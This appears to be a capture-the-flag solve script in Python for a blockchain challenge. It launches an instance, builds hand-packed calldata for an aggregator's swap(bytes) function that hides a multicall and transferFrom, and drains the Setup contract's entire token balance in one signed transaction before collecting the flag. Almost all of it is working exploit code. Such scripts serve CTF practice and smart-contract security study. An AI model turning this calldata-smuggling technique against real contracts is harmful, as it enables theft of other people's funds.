from web3 import Web3
from eth_account import Account
from eth_abi import encode as abi_encode
from pwn import remote, context
import struct

HOST = "challenge.cnsc.com.vn"
NC_PORT = 31054
HTTP_PORT = 31003


def get_instance():
    """Launch a new blockchain instance and get credentials"""
    print("[*] Launching new blockchain instance...")
    r = remote(HOST, NC_PORT)
    r.recvuntil(b"action?")
    r.sendline(b"1")
    data = r.recvall(timeout=30).decode()
    r.close()

    info = {}
    for line in data.split("\n"):
        if "uuid:" in line:
            info["uuid"] = line.split("uuid:")[1].strip()
        elif "private key:" in line:
            info["private_key"] = line.split("private key:")[1].strip()
        elif "setup contract:" in line:
            info["setup"] = line.split("setup contract:")[1].strip()

    info["rpc"] = f"http://{HOST}:{HTTP_PORT}/{info['uuid']}"
    return info


def get_flag(uuid):
    """Get flag after solving"""
    print("[*] Getting flag...")
    r = remote(HOST, NC_PORT)
    r.recvuntil(b"action?")
    r.sendline(b"3")
    r.recvuntil(b"uuid please:")
    r.sendline(uuid.encode())
    data = r.recvall(timeout=10).decode()
    r.close()
    return data


def addr_to_bytes(addr: str) -> bytes:
    return bytes.fromhex(addr[2:])


def build_exploit_calldata(coin_addr, setup_addr, transfer_amount):
    """Build the malicious Aggregator.swap(bytes) calldata"""

    transferFrom_data = bytes.fromhex("23b872dd") + abi_encode(
        ["address", "address", "uint256"],
        [setup_addr, coin_addr, transfer_amount],
    )

    multicall_data = bytes.fromhex("ac9650d8") + abi_encode(
        ["bytes[]"], [[transferFrom_data]]
    )

    swap_selector = Web3.keccak(text="swap(bytes)")[:4]
    data = bytearray(512)

    data_length = 230
    data[0:2] = struct.pack(">H", data_length)

    data[2:4] = struct.pack(">H", 64)

    data[4:24] = addr_to_bytes(coin_addr)

    data[24:44] = addr_to_bytes(coin_addr)

    data[44:64] = addr_to_bytes(coin_addr)

    data[64] = 0x00
    data[65:67] = struct.pack(">H", 180)

    data[67] = 0xF8
    data[68:70] = struct.pack(">H", 182)

    data[70] = 0xF8
    data[71:73] = struct.pack(">H", 184)

    data[73] = 0x00
    data[74:76] = struct.pack(">H", 0xFFFF)

    data[141] = 0x00
    data[142] = 0x00

    data[112:144] = b"\xff" * 32

    cmd_pos = data_length + 2
    data[cmd_pos] = 0x00
    data[cmd_pos + 1 : cmd_pos + 3] = struct.pack(">H", 0)

    seq_start = 68 + cmd_pos + 9
    data[cmd_pos + 3 : cmd_pos + 5] = struct.pack(">H", seq_start)
    data[cmd_pos + 7 : cmd_pos + 9] = struct.pack(">H", 72)

    multicall_pos = 350
    multicall_pos_in_data = multicall_pos - 68
    data[multicall_pos_in_data : multicall_pos_in_data + len(multicall_data)] = (
        multicall_data
    )

    seq_pos = cmd_pos + 9

    data[seq_pos] = 0x01
    data[seq_pos + 1 : seq_pos + 3] = struct.pack(">H", multicall_pos)
    seq_pos += 3

    data[seq_pos] = 0x04
    data[seq_pos + 1 : seq_pos + 3] = struct.pack(">H", multicall_pos + 4)
    data[seq_pos + 3 : seq_pos + 5] = struct.pack(">H", len(multicall_data) - 4)
    seq_pos += 5

    seq_end = 68 + seq_pos
    data[cmd_pos + 5 : cmd_pos + 7] = struct.pack(">H", seq_end)

    total_data_len = multicall_pos_in_data + len(multicall_data)
    bytes_param_length = cmd_pos + 9

    calldata = bytearray(4 + 32 + 32 + total_data_len)
    calldata[0:4] = swap_selector
    calldata[35] = 0x20
    calldata[66] = (bytes_param_length >> 8) & 0xFF
    calldata[67] = bytes_param_length & 0xFF
    calldata[68 : 68 + total_data_len] = data[:total_data_len]

    return bytes(calldata)


def main():
    context.log_level = "error"

    info = get_instance()
    print(f"[+] UUID: {info['uuid']}")
    print(f"[+] Setup: {info['setup']}")

    w3 = Web3(Web3.HTTPProvider(info["rpc"]))
    account = Account.from_key(info["private_key"])
    print(f"[+] Connected to blockchain as {account.address}")

    setup_abi = [
        {
            "inputs": [],
            "name": "coin",
            "outputs": [{"type": "address"}],
            "stateMutability": "view",
            "type": "function",
        },
        {
            "inputs": [],
            "name": "aggregator",
            "outputs": [{"type": "address"}],
            "stateMutability": "view",
            "type": "function",
        },
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [{"type": "bool"}],
            "stateMutability": "view",
            "type": "function",
        },
    ]

    setup = w3.eth.contract(address=info["setup"], abi=setup_abi)
    coin_addr = setup.functions.coin().call()
    aggregator_addr = setup.functions.aggregator().call()
    print(f"[+] Coin: {coin_addr}")
    print(f"[+] Aggregator: {aggregator_addr}")

    erc20_abi = [
        {
            "name": "balanceOf",
            "inputs": [{"name": "", "type": "address"}],
            "outputs": [{"name": "", "type": "uint256"}],
            "stateMutability": "view",
            "type": "function",
        }
    ]
    coin = w3.eth.contract(address=coin_addr, abi=erc20_abi)
    setup_balance = coin.functions.balanceOf(info["setup"]).call()
    print(f"[*] Setup token balance: {setup_balance}")

    print("[*] Sending exploit transaction...")
    transfer_amount = setup_balance
    calldata = build_exploit_calldata(coin_addr, info["setup"], transfer_amount)

    tx = {
        "from": account.address,
        "to": aggregator_addr,
        "data": calldata,
        "gas": 800_000,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(account.address),
        "chainId": w3.eth.chain_id,
    }

    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"[*] tx hash: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    if receipt["status"] == 1:
        print("[+] Exploit transaction succeeded")
        print(f"[+] isSolved: {setup.functions.isSolved().call()}")
    else:
        print("[-] Exploit failed (status == 0)")
        return

    flag_response = get_flag(info["uuid"])
    print("\n" + "=" * 50)
    print(flag_response)
    print("=" * 50)


if __name__ == "__main__":
    main()
